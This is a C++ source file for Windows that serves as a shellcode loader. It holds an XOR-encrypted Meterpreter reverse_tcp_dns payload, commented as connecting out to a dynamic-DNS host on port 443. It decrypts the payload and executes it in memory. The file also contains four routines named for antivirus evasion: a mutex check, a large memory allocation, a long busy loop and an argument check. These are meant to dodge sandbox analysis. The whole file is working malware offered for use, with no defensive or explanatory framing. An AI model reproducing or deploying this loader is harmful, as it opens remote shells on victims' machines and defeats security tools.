#include <cstring>
#include <cstdlib>
#include <cstdio>
#include <windows.h>
using namespace std;

unsigned char key[] = ";9-~<_i#DA8^qf&iâ˜ºoX<p$GOIq1Y})zX";
const int keylength = 32;

/*
	meterpreter/reverse_tcp_dns LHOST=wrmhle.ddns.net LPORT=443
*/
unsigned char buffer[] =
"\xe1\xf9\x96\xca\x85\x51\xf8\xfa\x30\x65\xcc\x04\x42\xaf\x97"
"\x33\x61\x5a\xbe\x5e\x02\x2f\x73\xca\xed\xa3\x2d\x83\x14\x2b"
"\xfb\x23\x8d\x2a\x23\x91\xbb\x4c\x1d\x47\xf3\xe2\xc6\x76\x45"
"\x29\x74\xb1\x2d\xa5\xc1\x80\x20\xb7\x2d\xfa\x3e\xef\xd7\x30"
"\xcb\xe2\x8f\x88\xf8\x4a\x2a\xde\x38\x36\x83\xd3\x99\xa4\x61"
"\xba\x1b\xd5\x47\xe6\xc3\xcd\x58\x03\xa9\x68\xb3\x07\xce\x41"
"\x8a\xb3\x6f\x62\x37\xf5\xb8\x3f\x29\x29\x4b\xa3\xfe\x92\x0d"
"\xbc\x0c\xa2\x14\x6a\x62\x50\xa3\x77\x89\x5c\xe9\xae\x33\xa4"
"\x8c\x07\x88\x63\x5a\x43\x0c\xd7\xb6\xf6\xc9\x0b\xbd\xfb\x0a"
"\xf2\xc2\x7a\x9f\x34\xc3\xd6\x60\xd5\xd0\x1a\xd6\x77\x46\x6c"
"\x7c\x1d\xbd\x78\x78\x28\x94\xb1\xea\x3b\x73\xc5\x88\x07\x39"
"\x6e\xed\xa2\x91\x1c\xa7\xac\x96\xa4\x2d\xf5\xa9\x12\x2f\x34"
"\xf3\x9d\x12\xd7\x15\x05\xda\xab\xa1\x47\xbe\x5d\x0b\x26\xa5"
"\xfa\x81\x95\x76\xf7\x55\xe4\xe7\xda\xa0\x73\xae\xa7\x3f\xd2"
"\x12\x9e\x6f\xdf\xb1\x69\xff\x43\x5b\x4b\xfb\x38\x07\x81\x74"
"\x6d\x33\x2a\xc2\x84\x99\xd9\xdf\x2e\x35\x04\x4d\xae\x73\x6b"
"\x06\x28\x87\x85\x14\x25\x96\x76\x72\x8e\x07\x4b\xac\xf0\x4b"
"\xcb\x7e\x2b\xb2\x34\x12\xa5\x2e\x11\xd2\xe3\x17\xc4\x0f\x6d"
"\xae\x2b\xc5\x6b\xca\x45\xd7\x67\xa9\xb6\x30\x4b\x90\x3b\x10"
"\xc5\x90\x23\xf5\x31\xab\x34\x11\x86\xf5\x39\x61\x5e\xa7\xc5"
"\x7f\xf0\x5f\x98\x82\x67\x68\x02\x40\x66\xd8\x28\xa2\x3f\x9d"
"\x7f\x5c\x2e\x55\xe9\xbd\xcb\x17\xca\x5a\x16\x09\x31\x3c\x26"
"\x37\xc4\x9d\xea\xa0\xa4\x7a\x16\x45\x56\x5f\x4c\x5a\x16\xc9"
"\xab\xdc\x5d\xde\xb1\x68\x85\x82\x5b\x3b\xba\x21\x88\x2c\xd2"
"\x25\x83\xc1\xf4\x86\x8b\x8d\x76\xbd\x1e\xeb\x29\xcf\x35\xd9"
"\x89\x6e\x3a\x35\xfa\x6e\xce\xc1";



void launchShell()
{
    int (*func) ();
    func = (int (*) ()) buffer;
    (int) (*func) ();
}

void decryptShell()
{
    unsigned int bufsize = strlen((char*)buffer);
    for(int i=0;i<bufsize;i++)
        buffer[i]^=key[i%keylength];
}
/*
void encryptShell()
{
    unsigned int bufsize = strlen((char*)buffer);
    for(int j=0;j<(bufsize+14)/15;j++)
    {
        printf("\"");
        for(int i=0;i<15 && j*15+i<bufsize;i++)
        {
            buffer[j*15+i]^=key[(j*15+i)%keylength];
            printf("\\x%.2hhx", buffer[j*15+i]);
            if(buffer[j*15+i]==0) printf("ERROR");
        }
        printf("\"\n");
    }
}
*/
/*
void convert()
{
    unsigned int bufsize = strlen((char*)buffer);
    for(int i=0;i<bufsize;i++)
        printf("%.2hhx ", buffer[i]);
}
*/


bool AV_Evade1()
{
    HANDLE mutex = CreateMutexA(0, 1, "mut");
    if(GetLastError() == ERROR_ALREADY_EXISTS)
        return 1;
    return 0;
}

bool AV_Evade2()
{
    const int MEM = 300000000;

    volatile char * lotofmem = NULL;
    lotofmem = (char *) malloc(MEM);
    if(lotofmem != NULL)
    {
        memset((void*)lotofmem, 0, MEM);
        free((void*)lotofmem);

        return 1;
    }
    return 0;
}

bool AV_Evade3()
{
    volatile int MAX = 1000000000, i;
    int cpt = 0;
    for(i=0; i<2*MAX; i++)
        cpt++;
    if(cpt==2*MAX) return 1;

    return 0;
}

bool AV_Evade4(char *arg[])
{
    if(strstr(arg[0], "namesys")>0 ||
        strstr(arg[1], "namesys")>0 ||
        strstr(arg[2], "namesys")>0)
        return 1;
    return 0;
}

bool AV_Evade(char *arg[])
{
    return AV_Evade1() && AV_Evade2() && AV_Evade3() && AV_Evade4(arg);
}




int main(int argc, char* argv[])
{
    if(!AV_Evade(argv)) return 1;

    decryptShell();

    launchShell();
}
